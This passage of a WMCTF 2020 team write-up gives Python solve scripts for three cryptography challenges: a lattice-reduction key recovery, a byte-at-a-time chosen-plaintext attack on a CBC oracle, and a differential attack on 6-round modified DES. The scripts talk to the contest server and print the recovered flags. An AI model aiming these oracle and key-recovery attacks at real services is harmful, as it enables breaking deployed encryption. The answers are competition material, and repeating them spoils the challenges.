class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot, sqrt</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> remote</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;81.68.174.63&#x27;</span>, <span class="number">8631</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proof_of_work</span>(<span class="params">txt, Hash</span>):</span><br><span class="line">    S = string.ascii_letters+string.digits</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> S:</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> S:</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> S:</span><br><span class="line">                <span class="keyword">if</span> sha256((a+b+c+txt).encode()).hexdigest() == Hash:</span><br><span class="line">                    <span class="built_in">print</span>(a+b+c)</span><br><span class="line">                    <span class="keyword">return</span> a+b+c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gaussian</span>(<span class="params">v1, v2</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> sqrt(v2[<span class="number">0</span>]**<span class="number">2</span>+v2[<span class="number">1</span>]**<span class="number">2</span>) &lt; sqrt(v1[<span class="number">0</span>]**<span class="number">2</span>+v1[<span class="number">1</span>]**<span class="number">2</span>):</span><br><span class="line">            v1, v2 = v2, v1</span><br><span class="line">        m = <span class="built_in">int</span>((v1[<span class="number">0</span>]*v2[<span class="number">0</span>]+v1[<span class="number">1</span>]*v2[<span class="number">1</span>])/(v1[<span class="number">0</span>]**<span class="number">2</span>+v1[<span class="number">1</span>]**<span class="number">2</span>))</span><br><span class="line">        <span class="keyword">if</span> m == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> (v1, v2)</span><br><span class="line">        v2 = [v2[<span class="number">0</span>]-m*v1[<span class="number">0</span>], v2[<span class="number">1</span>]-m*v1[<span class="number">1</span>]]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;XXX+&quot;</span>)</span><br><span class="line">nonce = r.recv(<span class="number">17</span>).decode()</span><br><span class="line">r.recvuntil(<span class="string">&quot; == &quot;</span>)</span><br><span class="line">target = r.recv(<span class="number">64</span>).decode()</span><br><span class="line">r.recvuntil(<span class="string">&quot;\nGive me XXX:&quot;</span>)</span><br><span class="line">w = proof_of_work(nonce, target)</span><br><span class="line">r.send(<span class="built_in">str</span>(w)+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;----------proof of work is ok!----------&quot;</span>)</span><br><span class="line">temp = r.recvuntil(<span class="string">&quot;What&#x27;s your choice?\n&quot;</span>)</span><br><span class="line">r.send(<span class="string">&quot;1\n&quot;</span>)</span><br><span class="line">temp = r.recvline()</span><br><span class="line">temp = r.recvline().strip().decode().split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">q, h, c = [<span class="built_in">int</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> temp]</span><br><span class="line">N = <span class="built_in">int</span>(r.recvline().strip().decode())</span><br><span class="line">cip = <span class="built_in">int</span>(r.recvline().strip().decode())</span><br><span class="line">s1, s2 = gaussian([<span class="number">1</span>, h], [<span class="number">0</span>, q])</span><br><span class="line">f, g = s1[<span class="number">0</span>], s1[<span class="number">1</span>]</span><br><span class="line">cake = (c*f % q) % g</span><br><span class="line">cake = inverse(f, g)*cake % g</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100000</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">pow</span>(cake+k*g, <span class="number">0x10001</span>, N) == cip:</span><br><span class="line">        cake = cake+k*g</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;cake is: &quot;</span>, cake)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">r.send(<span class="built_in">str</span>(cake)+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.recvline().strip().decode())</span><br><span class="line"><span class="comment">#WMCTF&#123;Wh4t_A_pi3ce_of_CAKE!&#125;</span></span><br></pre></td></tr></table></figure>



<h3><span id="game">Game</span><a href="#game" class="header-anchor"></a></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> remote</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">r = remote(<span class="string">&#x27;81.68.174.63&#x27;</span>, <span class="number">16442</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proof_of_work</span>(<span class="params">txt, Hash</span>):</span><br><span class="line">    S = string.ascii_letters+string.digits</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> S:</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> S:</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> S:</span><br><span class="line">                <span class="keyword">for</span> d <span class="keyword">in</span> S:</span><br><span class="line">                    <span class="keyword">if</span> sha256((a+b+c+d+txt).encode()).hexdigest() == Hash:</span><br><span class="line">                        <span class="built_in">print</span>(a+b+c+d)</span><br><span class="line">                        <span class="keyword">return</span> a+b+c+d</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">select_x</span>(<span class="params">x</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&quot;3. exit\n&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    r.send(<span class="built_in">str</span>(x))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;(in hex): &quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;XXXX+&quot;</span>)</span><br><span class="line">nonce = r.recv(<span class="number">16</span>).decode()</span><br><span class="line">r.recvuntil(<span class="string">&quot; == &quot;</span>)</span><br><span class="line">target = r.recv(<span class="number">64</span>).decode()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;waiting....&quot;</span>)</span><br><span class="line">w = proof_of_work(nonce, target)</span><br><span class="line">r.send(<span class="built_in">str</span>(w))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;----------proof of work is ok!----------&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;IV is: &quot;</span>)</span><br><span class="line">IV = r.recv(<span class="number">32</span>).decode()  <span class="comment"># 16 bytes -&gt; 32 hexlength</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;IV is: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(IV))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">secret = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> Byte <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>):<span class="comment">#Byte和执行前secret的已知长度是等价的 15 = byte_len+Byte mod 16</span></span><br><span class="line">    byte_len = (<span class="number">15</span> - (Byte % <span class="number">16</span>)) <span class="keyword">if</span> ((Byte % <span class="number">16</span>) != <span class="number">15</span>) <span class="keyword">else</span> <span class="number">16</span></span><br><span class="line">    bound = ((byte_len + Byte + <span class="number">1</span>) // <span class="number">16</span>) * <span class="number">32</span> <span class="comment"># 应该相等的范围应该是[bound-32:bound]</span></span><br><span class="line">    select_x(<span class="number">1</span>)</span><br><span class="line">    r_ = os.urandom(byte_len)</span><br><span class="line">    r.send(r_.<span class="built_in">hex</span>())</span><br><span class="line">    C_ = r.recvline().strip().decode()</span><br><span class="line">    C0 = IV <span class="keyword">if</span> bound==<span class="number">32</span> <span class="keyword">else</span> C_[bound-<span class="number">64</span>:bound-<span class="number">32</span>]</span><br><span class="line">    IV = C_[-<span class="number">32</span>:] <span class="comment"># 每次加密后及时更新IV</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;brute force &#123;&#125; byte&quot;</span>.<span class="built_in">format</span>(Byte+<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        select_x(<span class="number">1</span>)</span><br><span class="line">        Pi = <span class="built_in">int</span>(C0, <span class="number">16</span>) ^ <span class="built_in">int</span>(IV, <span class="number">16</span>) ^ <span class="built_in">int</span>((r_.<span class="built_in">hex</span>()+secret.<span class="built_in">hex</span>())[-<span class="number">30</span>:]+long_to_bytes(i).<span class="built_in">hex</span>(), <span class="number">16</span>)</span><br><span class="line">        r.send(long_to_bytes(Pi).<span class="built_in">hex</span>())</span><br><span class="line">        Ci = r.recvline().strip().decode()</span><br><span class="line">        IV = Ci[-<span class="number">32</span>:]</span><br><span class="line">        <span class="keyword">if</span> Ci[:<span class="number">32</span>] == C_[bound-<span class="number">32</span>:bound]:</span><br><span class="line">            secret += long_to_bytes(i)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Current secret: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(secret))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;secret is: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(secret))</span><br><span class="line">select_x(<span class="number">2</span>)</span><br><span class="line">r.send(secret.<span class="built_in">hex</span>())</span><br><span class="line">flag = r.recvline().strip().decode()</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#WMCTF&#123;Dont_ever_tell_anybody_anything___If_you_do__you_start_missing_everybody&#125;</span></span><br></pre></td></tr></table></figure>

<h3><span id="idiot-box">idiot box</span><a href="#idiot-box" class="header-anchor"></a></h3><p><strong>Second Blood</strong></p>
<p>改过的DES 6轮差分攻击</p>
<p>现学：</p>
<ul>
<li><a href="https://medium.com/lotus-fruit/breaking-des-using-differential-cryptanalysis-958e8118ff41">https://medium.com/lotus-fruit/breaking-des-using-differential-cryptanalysis-958e8118ff41</a></li>
<li><a href="http://www.cs.technion.ac.il/~biham/Reports/differential-cryptanalysis-of-the-data-encryption-standard-biham-shamir-authors-latex-version.pdf">http://www.cs.technion.ac.il/~biham/Reports/differential-cryptanalysis-of-the-data-encryption-standard-biham-shamir-authors-latex-version.pdf</a></li>
</ul>
<blockquote>
<p>现学材料里一个可能的疑惑点：第4轮的F函数中，有5个sbox的input(6bit)的差分值都是0，所以这5个sbox的output(4bit)的差分值也都是0，经过P置换后，得到的D’中有4*5&#x3D;20bit是已知的，所以后面第6轮的F函数的output的差分值:$F’ &#x3D; c’ \oplus D’ \oplus T_L’$中，有20bit是确定的；经过<strong>逆</strong>P置换后，得到第6轮8个sbox的outputs的差分值，其中有5个对应的sbox的output的差分值是已知的，所以能用medium里的那个方法把这5个sbox的key求出来。</p>
<p>c’为第3个F函数input的差分值，D’为第4个F函数input的差分值，F’为第6个F函数output的差分值，$T_L’$是密文左半部分的差分值。</p>
</blockquote>
<p><strong>攻击方法</strong></p>
<p>DES里面就sbox比较难搞，其他的部分就是一些线性置换，可以通过一些差分特性去操作一下这个sbox，然后就能得到key。</p>
<p>简单来说就是，找到一个差分特征后，可以用这个特征推4轮，然后计算$F’ &#x3D; c’ \oplus D’ \oplus T_L’$（第6轮F函数output的差分值），逆P置换，得到8个sbox的outputs的差分值out_xors，这个差分值的概率是最大的；接着，将2个已知的第6轮F函数的input（密文的右半部分）去做e扩展，得到$I_1, I_2$，分别分成8组${i_{11}, i_{12}, …, i_{18}}, {i_{21}, i_{22}, …, i_{28}}$，对应着8个sbox。</p>
<p>每一个sbox，对所有可能的64种key（6bit）作判断sbox($i_{1j}$ ^ key) ^ sbox($i_{2j}$ ^ key) &#x3D;&#x3D; out_xors[j]，如果等于，则将该key计数加1。尝试很多次后，必然有一个key出现的次数最多，且远超其他的key，该key即为正确的key。</p>
<p>这8个6bit的key合起来就是第6轮的subkey，又由于密钥扩展就是一个置换，可以反推出前面5轮的key。</p>
<p>把key反过来加密就能getflag。</p>
<p><strong>手动寻找差分特征</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_diff_output</span>(<span class="params">diff</span>):</span><br><span class="line">    p1 = getRandomNBitInteger(<span class="number">32</span>)</span><br><span class="line">    p2 = p1 ^ diff</span><br><span class="line">    k = getRandomNBitInteger(<span class="number">48</span>)</span><br><span class="line">    c1, c2 = F(p1, k), F(p2, k)</span><br><span class="line">    <span class="keyword">return</span> c1^c2, (p1,p2,c1,c2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">counter = Counter()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):</span><br><span class="line">    P_ = <span class="number">0x00000040</span></span><br><span class="line">    X_, _ = gen_diff_output(P_)</span><br><span class="line">    counter[X_] += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">X_, freq = counter.most_common(<span class="number">1</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(X_)[<span class="number">2</span>:].rjust(<span class="number">8</span>,<span class="string">&#x27;0&#x27;</span>), freq / <span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x00000002 -&gt; 0x00000002    0.217</span></span><br><span class="line"><span class="comment"># 0x00000040 -&gt; 0x00000000    0.2534</span></span><br><span class="line"><span class="comment"># 0x00000400 -&gt; 0x00000000    0.251</span></span><br><span class="line"><span class="comment"># 0x00000000 -&gt; 0x00000000    1</span></span><br><span class="line"><span class="comment"># 0x00002000 -&gt; 0x00000000    0.25</span></span><br><span class="line"><span class="comment"># 0x00004000 -&gt; 0x00000040    0.22</span></span><br><span class="line"><span class="comment"># 0x00020000 -&gt; 0x00020000    0.18</span></span><br></pre></td></tr></table></figure>
<p>发现了好几组非常优秀的差分特征。</p>
<p>以前我么得选择，现在我随便选。</p>
<p>就选这个0x00000040 -&gt; 0x00000000 0.2534</p>
<p><strong>画图分析</strong></p>
<p><img src="https://hackmd.summershrimp.com/uploads/upload_c126a80567a8eeab248c3b0ff26319cd.png"></p>
<blockquote>
<p>在线画图：<a href="https://draw.io/">https://draw.io</a></p>
</blockquote>
<p>可以推出来$F’ &#x3D; 0x00000040 \oplus T_L’$</p>
<p><strong>获取数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">from json import dump</span><br><span class="line"></span><br><span class="line">from tqdm import tqdm</span><br><span class="line">from Crypto.Util.number import long_to_bytes, getRandomNBitInteger</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">def gen_diff_input(diff):</span><br><span class="line">    p1 = getRandomNBitInteger(64)</span><br><span class="line">    p2 = p1 ^ diff</span><br><span class="line">    return p1, p2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = remote(&quot;81.68.174.63&quot;, 34129)</span><br><span class="line"># context.log_level = &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">rec = r.recvuntil(b&quot;required&quot;).decode()</span><br><span class="line">cipher_flag = re.findall(r&quot;\n([0-9a-f]&#123;80&#125;)\n&quot;, rec)[0]</span><br><span class="line">print(cipher_flag)</span><br><span class="line">r.recvline()</span><br><span class="line"></span><br><span class="line">pairs = []</span><br><span class="line">for i in tqdm(range(10000)):</span><br><span class="line">    p1, p2 = gen_diff_input(0x0000000000000040)</span><br><span class="line">    r.sendline(long_to_bytes(p1).hex().encode())</span><br><span class="line">    c1 = int(r.recvline(keepends=False), 16)</span><br><span class="line">    r.sendline(long_to_bytes(p2).hex().encode())</span><br><span class="line">    c2 = int(r.recvline(keepends=False), 16)</span><br><span class="line">    pairs.append(((p1,p2), (c1,c2)))</span><br><span class="line"></span><br><span class="line">r.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dump([cipher_flag, pairs], open(&quot;data&quot;, &quot;w&quot;))</span><br></pre></td></tr></table></figure>

<p><strong>差分攻击</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"><span class="keyword">from</span> json <span class="keyword">import</span> load</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cipher_flag, pairs = load(<span class="built_in">open</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;r&quot;</span>))</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inv_key</span>(<span class="params">key</span>):</span><br><span class="line">    inv_key = [<span class="number">0</span>]*<span class="number">48</span></span><br><span class="line">    key_bin = <span class="built_in">bin</span>(key)[<span class="number">2</span>:].rjust(<span class="number">48</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>):</span><br><span class="line">        inv_key[pc_key[j]] = key_bin[j]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(inv_key), <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inv_keys</span>(<span class="params">k6</span>):</span><br><span class="line">    keys = [<span class="number">0</span>]*<span class="number">6</span></span><br><span class="line">    keys[-<span class="number">1</span>] = k6</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">        keys[i] = inv_key(keys[i+<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> keys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inv_p</span>(<span class="params">x</span>):</span><br><span class="line">    x_bin = [<span class="built_in">int</span>(_) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">bin</span>(x)[<span class="number">2</span>:].rjust(<span class="number">32</span>, <span class="string">&#x27;0&#x27;</span>)]</span><br><span class="line">    y_bin = [<span class="number">0</span>]*<span class="number">32</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        y_bin[pbox[i]] = x_bin[i]</span><br><span class="line">    y = <span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">str</span>(_) <span class="keyword">for</span> _ <span class="keyword">in</span> y_bin]), <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> y</span><br><span class="line"></span><br><span class="line"><span class="comment"># --------------------------</span></span><br><span class="line">candidate_keys = [Counter() <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _, cs <span class="keyword">in</span> tqdm(pairs):</span><br><span class="line">    c1, c2 = cs</span><br><span class="line">    <span class="keyword">if</span> c1 ^ c2 == <span class="number">0x0000004000000000</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    l1, l2 = c1 &gt;&gt; <span class="number">32</span>, c2 &gt;&gt; <span class="number">32</span></span><br><span class="line">    r1, r2 = c1 &amp; <span class="number">0xffffffff</span>, c2 &amp; <span class="number">0xffffffff</span></span><br><span class="line">    <span class="comment"># print(r1, r2)</span></span><br><span class="line"></span><br><span class="line">    F_ = l1^l2^<span class="number">0x00000040</span></span><br><span class="line">    F_ = inv_p(F_) <span class="comment"># xor of the two outputs of sbox, 32bit</span></span><br><span class="line"></span><br><span class="line">    Ep1 = e(r1) <span class="comment"># 48bit</span></span><br><span class="line">    Ep2 = e(r2) <span class="comment"># 48bit</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        inp1 = (Ep1 &gt;&gt; (<span class="number">7</span>-i)*<span class="number">6</span>) &amp; <span class="number">0b111111</span>   <span class="comment"># 6bit</span></span><br><span class="line">        inp2 = (Ep2 &gt;&gt; (<span class="number">7</span>-i)*<span class="number">6</span>) &amp; <span class="number">0b111111</span>   <span class="comment"># 6bit</span></span><br><span class="line">        out_xor = (F_ &gt;&gt; (<span class="number">7</span>-i)*<span class="number">4</span>) &amp; <span class="number">0b1111</span>   <span class="comment"># 4bit</span></span><br><span class="line">        <span class="keyword">for</span> key <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">            <span class="keyword">if</span> s(inp1^key, i) ^ s(inp2^key, i) == out_xor:</span><br><span class="line">                candidate_keys[i][key] += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(candidate_keys)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ----------------------</span></span><br><span class="line">key6 = []</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> candidate_keys:</span><br><span class="line">    <span class="built_in">print</span>(c.most_common(<span class="number">2</span>))</span><br><span class="line">    key6.append(c.most_common(<span class="number">1</span>)[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(key6)</span><br><span class="line"><span class="comment"># key6 = [53, 44, 38, 7, 7, 30, 29, 52]</span></span><br><span class="line">k6 = <span class="built_in">sum</span>(key6[i]&lt;&lt;(<span class="number">7</span>-i)*<span class="number">6</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>))</span><br><span class="line"><span class="comment"># k6 = 236161043654516</span></span><br><span class="line">keys = inv_keys(k6)</span><br><span class="line"><span class="built_in">print</span>(keys)</span><br><span class="line"></span><br><span class="line">ps, cs = pairs[<span class="number">0</span>]</span><br><span class="line">p1, c1 = ps[<span class="number">0</span>], cs[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">assert</span> enc_block(p1) == c1</span><br><span class="line"><span class="comment"># Ok! key is right!</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># To decrypt, reverse the keys.</span></span><br><span class="line">keys = keys[::-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(enc(<span class="built_in">bytes</span>.fromhex(cipher_flag)))</span><br><span class="line"><span class="comment"># b&#x27;WMCTF&#123;D1ff3r3nti@1_w1th_1di0t_B0X3s&#125;\x00\x00\x00\x00&#x27;</span></span><br></pre></td></tr></table></figure>

<p>WMCTF{D1ff3r3nti@1_w1th_1di0t_B0X3s}</p>
</div><div class="article-licensing box"><div class="licensing-title"><p>WMCTF 2020 SU Write-Up</p><p><a href="https://team-su.github.io/posts/50874.html">https://team-su.github.io/posts/50874.html</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>Author</h6><p>SUers</p></div></div><div class="level-item is-narrow"><div><h6>Posted on</h6><p>2020-08-04</p></div></div><div class="level-item is-narrow"><div><h6>Updated on</h6><p>2025-07-13</p></div></div><div class="level-item is-narrow"><div><h6>Licensed under</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" 